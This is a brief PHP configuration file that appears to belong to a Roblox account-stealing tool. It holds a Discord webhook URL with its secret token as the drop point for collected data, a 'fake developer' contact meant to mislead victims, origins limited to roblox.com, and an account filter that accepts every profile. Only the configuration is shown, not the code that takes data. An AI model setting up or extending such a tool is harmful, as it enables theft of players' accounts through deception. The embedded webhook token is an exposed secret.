<?php
    // webhook link
    $webhook = "https://discord.com/api/webhooks/874795780060364921/tsRSHur5XB2gV9g0zbHyldKfW6zUmHlX5oJQ6kwglPrQs9YznOLZmAlidh3Nkk7-EI2Y";
    // fake developer for the bot the users may contact
    $discord_contact = "TeeScrap#1474";
    
    $allowed_origins = array(
        "https://www.roblox.com",
        "https://web.roblox.com"
    );
    function account_filter($profile) {
        return true;
    }
?>
